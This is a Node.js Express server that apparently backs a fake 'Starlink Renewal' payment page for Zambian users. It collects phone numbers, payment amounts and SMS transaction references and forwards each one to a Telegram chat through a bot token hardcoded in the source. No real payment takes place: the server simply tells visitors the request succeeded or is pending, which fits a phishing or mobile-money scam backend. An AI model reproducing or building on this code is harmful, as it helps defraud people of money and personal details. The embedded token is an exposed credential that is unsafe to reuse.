const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = '8959207735:AAGS-K_CWxLkMoW-JBHu6fxLz4xcKp7QnuA'; 
const TELEGRAM_CHAT_ID = '7526966397';

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to send messages to Telegram
async function sendTelegramNotification(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const data = await res.json();
    if (data.ok) {
      console.log('[TELEGRAM SUCCESS] Notification delivered successfully.');
    } else {
      console.error('[TELEGRAM ERROR]', data.description);
    }
  } catch (error) {
    console.error('[NETWORK ERROR] Failed to reach Telegram API:', error.message);
  }
}

// Payment Request Endpoint
app.post('/api/request-payment', async (req, res) => {
  const { phone, amount, plan } = req.body;

  console.log(`[PAYMENT REQUEST] Plan: ${plan || 'Starlink Renewal'} | Amount: ZMW ${amount || '45.00'} | Phone: +260${phone}`);

  const telegramMessage = 
`<b>ℹ️ Payment Request Initiated</b>\n\n` +
`<b>Package:</b> ${plan || 'Starlink Renewal'}\n` +
`<b>Amount:</b> ZMW ${amount || '45.00'}\n` +
`<b>Phone Number:</b> +260${phone}\n` +
`<b>Status:</b> Pending Prompt Approval`;

  await sendTelegramNotification(telegramMessage);

  res.json({
    status: 'success',
    message: 'Payment request initiated.'
  });
});

// Transaction Verification Endpoint
app.post('/api/verify-sms', async (req, res) => {
  const { reference } = req.body;

  console.log(`[VERIFICATION REQUEST] Reference: ${reference}`);

  const telegramMessage = 
`<b>🔄 Verification Requested</b>\n\n` +
`<b>Reference:</b> <code>${reference || 'N/A'}</code>`;

  await sendTelegramNotification(telegramMessage);

  res.json({
    status: 'pending',
    message: 'Verification in progress.'
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});